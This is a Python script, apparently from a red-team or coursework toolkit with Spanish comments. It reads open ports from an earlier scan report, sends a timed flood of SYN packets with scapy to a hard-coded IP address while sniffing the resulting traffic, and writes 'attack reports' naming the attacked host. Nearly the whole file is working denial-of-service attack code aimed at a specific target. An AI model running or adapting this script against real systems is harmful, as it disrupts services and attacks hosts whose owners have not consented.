from datetime import datetime
from scapy.all import IP, RandInt, sniff, send, TCP
from threading import Thread

import os
import re
import shutil
import time


HOST = "74.179.81.132"
TIMEOUT_SNIFFER = 10
TIMEOUT_ENV_PAQ = 8
ruta_actual = os.getcwd()
ruta_reporte_scan = os.path.join(ruta_actual, "ultimo_reporte_scan.txt")

def validar_puertos_abiertos(ruta_reporte):
    """
    Lee el reporte (txt) generado por scanner.py y obtiene la lista de puertos abiertos
    Retorna:
        puertos_abiertos = Lista de puertos abiertos
    """
    puertos_abiertos = []

    try:
        # Lee el archivo, y extrae unicamente el numero de puerto
        with open(ruta_reporte, "r", encoding="utf-8") as archivo:
            for l in archivo:
                linea = l.strip()
                m = re.search(r"Puerto\s+(\d+):\s+open", linea, re.IGNORECASE)
                if m:
                    # Agrega cada numero a la lista de puertos
                    puertos_abiertos.append(int(m.group(1)))
    except FileNotFoundError:
        print(f"[!] Archivo {ruta_reporte} no encontrado.")
    except Exception as e:
        print(f"[!] Error leyendo {ruta_reporte}: {e}")

    return puertos_abiertos


def procesar_paquete(paquete, trafico_sniffer):
    """
    Procesa un paquete capturado como un dict y lo agregra a una lista de eventos.
    Arg:
        paquete: Paquete capturado por el Sniffer
        trafico_sniffer: Lista de trafico capturado en el sniffer
    """
    # Almacena todos los datos que se capturan en el sniffer
    try:
        datos_paquete = {
            "summary": paquete.summary()
        }

        # Agrega el paquete a la lista de eventos
        trafico_sniffer.append(datos_paquete)

    except Exception as e:
        print(f"[!] Error procesando el paquete: {e}")


def sniffer_de_trafico(trafico_sniffer):
    """
    Captura de tráfico entre equipo local y el host durante XX segundos
        variable timeout = XX segundos
    Arg:
        trafico_sniffer: Lista donde se almacena el trafico capturado
    """

    filtro_bpf = f"host {HOST}"

    try:
        # Funcion de sniffer en scapy
        sniff(
            filter=filtro_bpf,
            iface="wlan0",
            prn=lambda paquete: procesar_paquete(paquete, trafico_sniffer),
            timeout=TIMEOUT_SNIFFER
        )

    except Exception as e:
        print(f"[!] Error en sniffer: {e}")


def envio_TCP(puertos_dest):
    """
    Envía una cantidad definida de paquetes a los puertos abiertos del host
    Arg:
        puertos_dest: Lista de puertos abiertos, obtenida del reporte de scanner.py
    Retorna:
        reporte_env_paq: Reporte de datos de los paquetes enviados 
    """

    # Dict = cada puerto con una lista de trafico enviado
    reporte_env_paq = {p: [] for p in puertos_dest}
    ip = IP(dst = HOST)
    tiempo_envio = TIMEOUT_ENV_PAQ

    inicio = time.time()
    cant_paquetes = 0

    # Ejecuta el envio de paquetes por un tiempo definido
    while time.time() - inicio < tiempo_envio:
        cant_paquetes += 1
        # Envia un paquete a cada puerto abierto
        for puerto in puertos_dest:
            try:
                tcp = TCP(dport=puerto, seq=RandInt(),  flags="S")
                packet = ip/tcp # Arma el paquete a enviar
                packet = packet.__class__(bytes(packet))

                try:
                    send(packet, verbose=0) # Envía el paquete
                except Exception as e:
                    print(f"[!] Error enviando paquete al puerto {puerto}: {e}")

                print(f"Enviando paquete SYN a {HOST}, {puerto}/tcp\n")

                # Guarda los datos especificos en el reporte
                reporte_env_paq[puerto].append({
                    "numero" : cant_paquetes,
                    "tamaño" : len(packet),
                    "ip_o" : packet[IP].src,
                    "ip_d" : packet[IP].dst,
                    "puerto_o" : packet[TCP].dport,
                    "flag" : packet[TCP].flags,
                    "seq" : packet[TCP].seq,
                    "time" : datetime.now()
                    })
            
            except Exception as e:
                print(f"[!] Error armando el paquete para el puerto {puerto}: {e}")

    return reporte_env_paq


def ejecutar_packet_attack(puertos):
    """
    Lanza el sniffer en un thread (daemon) y envía SYN en el thread principal.
    Arg:
        puertos: Lista de puertos abiertos
    Retorna:
        reporte_syn = Datos recolectados al ejecutar el envío de trafico SYN
        trafico_generado = Lista de eventos encontrados
    """
    
    trafico_generado = []

    try:
        # Prepara la funcion de sniffer para ejecutarse como daemon
        hilo = Thread(target=sniffer_de_trafico, args=(trafico_generado,), daemon=True)
        hilo.start() # Inicia el hilo (daemon)
        print("[+] Iniciando Sniffer de trafico...\n")

        print("[+] Iniciando Envio de paquetes SYN...\n")
        reporte_syn = envio_TCP(puertos) # Inicia el envio de trafico
        print("[+] Envio de paquetes SYN finalizado!\n")

        hilo.join()  # Espera a que el sniffer termine por timeout

        print("[+] Sniffer de trafico finalizado!\n")
        
        return reporte_syn, trafico_generado
    
    except Exception as e:
        print(f"[!] Error en ejecutando packet_attack: {e}")


def obtener_fecha_hora():
    """
    Devuelve la fecha y hora actual con formato YYYY-MM-DD_HH-MM-SS.
    """
    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")


def formatear_reportes(datos_envio, datos_sniff, timestamp):
    """
    Da formato legible al reporte generado con envio_TCP
    Retorna:
        txt_envio_syn: Informacion del envio de SYN en formato legible para el usuario
        txt_cap_sniff: Informacion de la captura de trafico en formato legible para el usuario
    """

    # Estructura del Reporte de envios SYN
    txt_envio_syn = f"""
    ====== REPORTE DE ENVIOS SYN - ({timestamp}) ======
    Fecha/Hora: {timestamp}
    IP de host atacado: {HOST}
    Tiempo de envío de paquetes: {TIMEOUT_ENV_PAQ} seg\n\n"""
    try:
        for puerto, paquetes in datos_envio.items(): # Recorre cada protocolo
            txt_envio_syn += (f"\n    Puerto: [ {puerto} ]\n")
            for info in paquetes: # Recorre cada paquete que se encuentre en el protocolo
                txt_envio_syn += (
                    f"    Paq # {str(info['numero']).ljust(3)}"
                    f" | Seq = {str(info['seq']).ljust(10)}"
                    f" | Flag {info['flag']}"
                    f" | {info['ip_o']} >> {info['ip_d']}"
                    f" | Puerto Salida = {info['puerto_o']}"
                    f" | Hora = {info['time']}\n"
                    )
    except Exception as e:
        print(f"Error al dar formato a reporte de envion SYN: {e}")
    
    # Estructura del Reporte de captura de trafico
    txt_cap_sniff = f"""
    ====== REPORTE DE CAPTURA DE SNIFFER- ({timestamp}) ======
    Fecha/Hora: {timestamp}
    IP de host atacado: {HOST}
    Tiempo de captura: {TIMEOUT_SNIFFER} seg\n\n"""
    
    try:
        for evento in datos_sniff: # Recorre cada evento capturado por el sniffer
            txt_cap_sniff += f"    {evento["summary"]}\n"
    except Exception as e:
        print(f"Error al dar formato a reporte de Sniffer: {e}")

    return txt_envio_syn, txt_cap_sniff


def guardar_reporte(datos_envio, datos_sniff):
    """
    Guarda un reporte del ataque en un archivo .txt
    Arg:
        datos_envio: Reporte de datos obtenidos en el envio de paquetes
        datos_sniff: Reporte de datos obtenidos en la captura de trafico
    """

    try:
        print("-" * 70)
        print("\nGenerando reporte de ataque.....\n")
        timestamp = obtener_fecha_hora()
        
        # Se definen los nombres de los reportes segun el timestamp
        nombre_repo_syn = f"reporte_envio_paquetes_{timestamp}.txt"
        nombre_repo_sniff = f"reporte_sniffer_{timestamp}.txt"
        nombres = [nombre_repo_syn, nombre_repo_sniff] # Lista con los nombres

        # Se da formato a los reportes con la funcion "formatear reportes"
        repo_syn, repo_sniff = formatear_reportes(datos_envio, datos_sniff, timestamp)
        repos = [repo_syn, repo_sniff] # Lista con los reportes legibles

        # Se guardan los reportes en equipo
        for x in range(2):
            with open(nombres[x], "w", encoding="utf-8") as archivo:
                archivo.write(repos[x])

        # Valida que exista o crea la ruta "Reportes_Red_Team/Reportes_Packet_Attack"
        os.makedirs("Reportes_Red_Team/Reportes_Packet_Attack", exist_ok=True)

        ruta_syn = os.path.join("Reportes_Red_Team/Reportes_Packet_Attack", nombres[0])
        ruta_sniff = os.path.join("Reportes_Red_Team/Reportes_Packet_Attack", nombres[1])

        # Copia los archivos al directorio Reportes_Packet_Attack
        shutil.move(nombres[0], ruta_syn)
        shutil.move(nombres[1], ruta_sniff)
        
        print("[+] Reporte guardado en: Reportes_Red_Team/Reportes_Packet_Attack/\n")
    except OSError as e:
        print(f"[!] Error guardando reporte: {e}\n")
    print("-" * 70)


if __name__ == "__main__":
    # 1) Se Obtiene la lista de los puertos abiertos
    puertos = validar_puertos_abiertos(ruta_reporte_scan)
    print("Puertos abiertos:", puertos)

    # 2) Se inicia el packet_attack
    print("-" * 70)
    reporte_syn, eventos_sniff = ejecutar_packet_attack(puertos)
    print(f"Total de eventos capturados: {len(eventos_sniff)}\n")

    # 3) Se guarda el reporte del Packet_attack
    guardar_reporte(reporte_syn, eventos_sniff)


